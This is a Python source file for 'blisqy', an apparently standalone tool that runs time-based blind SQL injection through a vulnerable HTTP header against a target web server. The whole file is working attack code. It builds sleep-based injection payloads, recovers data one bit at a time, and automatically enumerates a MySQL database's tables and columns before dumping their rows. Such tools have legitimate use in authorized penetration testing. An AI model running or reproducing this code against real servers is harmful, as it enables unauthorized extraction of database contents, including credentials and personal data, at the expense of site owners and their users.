#!/usr/bin/python

# Writer : John Troony
# Online-handle : @johntroony


from socket import (socket, AF_INET, SOCK_STREAM)
import optparse
import cProfile
import time
import sys


def testSql(sql):
    '''Time-based BlindSQLi Test. '''

    # Connect to webserver
    try:
        s = socket(AF_INET, SOCK_STREAM, 0)
        s.connect((server, port))

        try:
            injection = SQLinject

            injection = injection.replace("*sql*", sql)
            injection = injection.replace("*time*", str(sleepTime))
        except Exception as error:
            print(red + str(error)) + clear
            sys.exit(0)

        # Send our Payload
        data = ""
        data += "GET / HTTP/1.1\r\n"
        data += "Host: "
        data += server + "\r\n"
        data += vulnHeader
        data += ": "
        data += headerValue + injection + "\r\n"
        data += "Connection: close\r\n\r\n"

        # Mark time before execution
        t1 = time.time()

        s.send(data)
        s.recv(0)

        # Mark time after execution
        t2 = time.time()

        # Compare if time diffrence is greater than sleepTime
        if t2 - t1 > sleepTime:
            return True
        else:
            return False

    except Exception as error:
        print(red + str(error) + clear)


def constructor(inj, string_pos):
    '''Use bit masking to retrieve ASCII equivalent Character.'''
    char_binary = ""

    # values for bit masking `for x in range(0,8): 2**x`
    for i in (1, 2, 4, 8, 16, 32, 64, 128):

        # If injection worked with the bit mask on, True=1, else False=0;
        # Append on strx
        if testSql("select ascii(substring((%s),%s,1))&%s" % (
                inj, string_pos, i)) is True:
            char_binary += "1"
        else:
            char_binary += "0"

    # Get integer value from binary value stored at strx
    ascy = int(char_binary, 2)

    # Since value is stored in revrse order, rearrange the byte order
    revAscy = int('{:08b}'.format(ascy)[::-1], 2)

    # Get ASCII value
    alpha = chr(revAscy)

    # If string terminator == ascii, signal for a break in the while loop
    if alpha == "\0":
        return "done"
    else:
        return alpha


def DataPump(SqlStatement, sleepTime):
    '''Prepares SQL Payload to function constructor()'''
    counter = 1
    result = ""
    while True:

        try:
            Character = constructor(SqlStatement, counter)

            if (Character is not None) & (Character != "done"):
                result += Character
                counter += 1

            if Character == "done":
                break

        except KeyboardInterrupt:
            print("Key-board Interrupt")
            print("Stopping.....")
            sys.exit()
    return result


def StatusUpdate(payload):
    '''Prints an update of what Blisqy is doing...'''
    print(cyan + "Extracting Data from ====> %s : %s %s" %
          (server, port, clear))

    print(green + "Current Payload : " + clear + red + payload + clear)

    breaker = cyan + "=============================================" + clear
    print(breaker)


def BreakPoint(message):
    '''Pause execution and interact with user'''

    userAction = "\n" + yellow + message + clear
    ans = raw_input(userAction)
    ans = ans.lower()

    if (ans == "n") | (ans == "no"):
        msg = yellow + "Close Sessions? yes/no : " + clear
        action = ans = raw_input(msg)

        if (action == "y") | (action == "yes"):
            sys.exit()


def tableDigger(table, interactive):
    '''Enumerate tables in a Schema/DB & Pulling data from the tables. '''

    print(cyan + "Preparing to Enumerate Table : %s" % table + clear)
    print(cyan + "======================================" + clear)

    # Get Number of Columns in a Table
    print(green + "[+] Getting Number of Columns in Table : %s" %
          table + clear)

    CountColumns = ""
    CountColumns += "select count(*) from "
    CountColumns += "(select column_name FROM "
    CountColumns += "information_schema.columns "
    CountColumns += "WHERE table_name = '%s') t"
    CountColumns = CountColumns % table
    CountedColumns = DataPump(CountColumns, sleepTime)

    print(yellow + "[-] " + CountedColumns + clear + "\n")

    columns = []
    counter = 1

    # Get column names and put in a list columns
    print(green + "[+] Getting  all Column Names in Table : %s " %
          table + clear)

    while counter <= int(CountedColumns):
        GetColumn = ""
        GetColumn += "select column_name FROM "
        GetColumn += "(select column_name FROM "
        GetColumn += "information_schema.columns WHERE "
        GetColumn += "table_name='%s' AND table_schema "
        GetColumn += "!= 'mysql' AND table_schema "
        GetColumn += "!= 'information_schema' "
        GetColumn += "order by column_name limit %d) "
        GetColumn += "t order by column_name desc limit 1"
        GetColumn = GetColumn % (table, counter)

        column = DataPump(GetColumn, sleepTime)
        print(yellow + "[-] " + column + clear)
        columns.append(column)
        counter = counter + 1

    # Get all rows in a Table
    print(green + "\n[+] Getting number of Rows in Table : %s " %
          table + clear)
    allRows = "select count(*) from (select * from %s) t" % table
    CountedRows = DataPump(allRows, sleepTime)
    print(yellow + "[-] " + CountedRows + clear + "\n")

    rows = []
    counter = 1

    interactive = interactive.lower()

    if interactive == "on":
        # Get all data from rows
        print(green + "[+] Getting data from Table : %s " % table + clear)
        msg = "Enter Columns separated by an asterisk (*).\n"
        msg += "e.g id*fname*passwd or skip : "

        outMsg = red + msg + clear
        OutputColumns = raw_input(outMsg)
        outMsgColums = OutputColumns.replace("*", " : ")

        if OutputColumns != 'skip':
            print(cyan + "[-] %s" % outMsgColums)
            OutputColumns = OutputColumns.replace("*", ",' : ',")

            while counter <= int(CountedRows):
                variables = (OutputColumns, table, counter)
                getRow = ""
                getRow += "select result from "
                getRow += "(select concat(%s) result from %s "
                getRow += "order by result limit %d) "
                getRow += "t order by result "
                getRow += "desc limit 1"
                getRow = getRow % variables

                row = DataPump(getRow, sleepTime)
                print(yellow + "[-] " + row + clear)

                rows.append(row)
                counter = counter + 1

        elif OutputColumns == 'skip':
            print(red + "Skipping....." + clear)

    elif interactive == "off":
        print(green + "[+] Getting data from Table : %s " % table + clear)
        # Concat all Columns
        query_columns = ''
        for discovered_column in columns:
            query_columns += discovered_column + ",':',"

        query_columns = query_columns[:-5]

        outMsgColums = query_columns.replace(",':',", ":")
        print(cyan + "[-] %s" % outMsgColums)

        while counter <= int(CountedRows):
            # SQL Query
            getRow = ""
            getRow += "select result from "
            getRow += "(select concat(%s) result from %s "
            getRow += "order by result limit %d) "
            getRow += "t order by result "
            getRow += "desc limit 1"
            getRow = getRow % (query_columns, table, counter)

            row = DataPump(getRow, sleepTime)
            print(yellow + "[-] " + row + clear)
            rows.append(row)
            counter = counter + 1


def MysqlDigger(sleepTime, interactive):
    '''Automates the process of enumerating all availabe tables in a DB'''

    # Get Current Database
    print(green + "[+] Getting Current Database : " + clear)

    try:
        currentDB = "select database()"
        DBname = DataPump(currentDB, sleepTime)

        print(yellow + "[-] " + DBname + clear + "\n")

        # Count number of TABLES available in non system schema (to be used in
        # getting tableNames)
        print(green + "[+] Getting  number of TABLES from Schema " + clear)

        tableCount = ""
        tableCount += "select count(*) from "
        tableCount += "(select table_name "
        tableCount += "FROM information_schema.tables "
        tableCount += "WHERE table_schema != 'mysql' "
        tableCount += "AND table_schema != "
        tableCount += "'information_schema') t"
        CountedTables = DataPump(tableCount, sleepTime)

        print(yellow + "[-] " + CountedTables + clear + "\n")

        counter = 1
        tables = []

    except Exception as err:
        print(err)

    # Get all TABLE_NAMES from schema, increment inner limit till total
    # counted TABLES available
    print(green + "[+] Getting  all TABLE NAMES from Schema " + clear)

    try:
        while counter <= int(CountedTables):
            GetTableName = ""
            GetTableName += "select table_name from "
            GetTableName += "(SELECT table_name FROM "
            GetTableName += "information_schema.tables WHERE "
            GetTableName += "table_schema != 'mysql' "
            GetTableName += "AND table_schema != 'information_schema' "
            GetTableName += "order by table_name limit %d) "
            GetTableName += "t order by table_name "
            GetTableName += "desc limit 1"
            GetTableName = GetTableName % counter
            TableName = DataPump(GetTableName, sleepTime)

            print(yellow + "[-] " + TableName + clear)

            tables.append(TableName)
            counter = counter + 1

        # Get all TABLE_NAMES from all Columns from discovered Tables
        if interactive == "on":

            msg = "Get all Columns from discovered Tables? yes/no  :  "
            BreakPoint(msg)

            msgout = green + \
                "\n[+] Enumerate a Specific Table (yes/no) : " + clear
            ans = raw_input(msgout)
            ans = ans.lower()

            if (ans == "y") | (ans == "yes"):
                msgout = green + "[+] Enter Table Name : " + clear
                userTable = raw_input(msgout)

                # Check if table is in list tables before movin on
                while userTable not in tables:
                    msg = "[+] Are you nutts! Enter a valid Table Name : "
                    msgout = red + msg + clear
                    userTable = raw_input(msgout)

                tableDigger(userTable, interactive)
                sys.exit()

            elif (ans == "n") | (ans == "no"):
                for table in tables:
                    tableDigger(table, interactive)

        elif interactive == "off":
            for table in tables:
                tableDigger(table, interactive)

    except Exception as err:
        print(err)


if __name__ == '__main__':
    value = 0
    x = 1

    # Colors for Notifications and Errors
    red = "\x1b[1;31m"
    cyan = "\x1b[1;36m"
    green = "\x1b[1;32m"
    yellow = "\x1b[1;33m"
    clear = "\x1b[0m"

    # Check if options are correctly passed
    helpMessage = ""
    helpMessage += "blisqy.py --server <Web Server> "
    helpMessage += "--port <port> --header <vulnerable header> "
    helpMessage += "--hvalue <header value> --inject <point of injection>  "
    helpMessage += "--payload <custom sql payload> --dig <yes/no> "

    parser = optparse.OptionParser(helpMessage)

    parser.add_option('--server', dest='Webserver',
                      type='string', help='Specify host (web server) IP')

    parser.add_option('--port', dest='Port', type='int', help='Specify port')

    parser.add_option('--header', dest='VulnHeader',
                      type='string', help='Provide a vulnerable HTTP Header')

    parser.add_option('--hvalue', dest='HeaderValue', type='string',
                      help='Specify the value for the vulnerable header')

    parser.add_option('--inject', dest='Injection', type='string',
                      help='Provide where to inject Sqli payload')

    parser.add_option('--payload', dest='Payload', type='string',
                      help='Provide SQL statment/query to inject as payload')

    parser.add_option('--dig', dest='Digger', type='string',
                      help='Automatic Mysql-Schema enumeration (takes time!)')

    parser.add_option('--sleeptime', dest='Sleep', type='float',
                      help='Sleep-Time for blind-SQLi query (default : 0.9)')

    parser.add_option('--interactive', dest='interact', type='string',
                      help='Turn interactive mode on/off (default : off)')

    (options, args) = parser.parse_args()

    global server
    global port
    global vulnHeader
    global headerValue
    global payload
    global SQLinject
    global mysqldig
    global sleepTime

    server = options.Webserver
    port = options.Port
    vulnHeader = options.VulnHeader
    headerValue = options.HeaderValue
    payload = options.Payload
    SQLinject = options.Injection
    mysqldig = options.Digger
    sleepTime = options.Sleep
    interactive = options.interact

    if (SQLinject is None):
        # We expect something like "' or if((*sql*),sleep(*time*),0) and
        # '1'='1"
        msg = "Please Provide Template For Inject --inject" + "\n"
        print(yellow + msg + clear)

        print(yellow + "For Example :" + clear)

        template_example = ""
        template_example += cyan + "' or if((" + red + "*sql*" + clear
        template_example += cyan + "),sleep(" + red + "*time*" + clear
        template_example += cyan + "),0) and '1'='1" + clear + "\n"
        print(template_example)

        template_usage = ""
        template_usage = green + red + "*sql*" + clear
        msg1 = " : This is where SQL Payloads will be inserted"
        template_usage += green + msg + clear + "\n"

        template_usage += green + red + "*time*" + clear
        msg2 = " : This is where Time-Based test will be inserted"
        template_usage += green + msg2 + clear

        print(template_usage)
        sys.exit(0)

    if (sleepTime is None):
        sleepTime = 0.5

    if (interactive is None):
        interactive = "off"

    if (server is None) | (port is None) | (headerValue is None):
        print(yellow + "Please Provide All Required Arguments!" + clear)
        print(red + "USAGE :" + clear)
        print(cyan + parser.usage + clear)
        sys.exit(0)

    elif (payload is not None) & (mysqldig is None):
        StatusUpdate(payload)
        SqlQuery = DataPump(payload, sleepTime)
        print(yellow + SqlQuery + clear)

    elif (mysqldig == "yes") | (mysqldig == "Yes") | (mysqldig == "YES"):
        cProfile.run('MysqlDigger(sleepTime, interactive)')
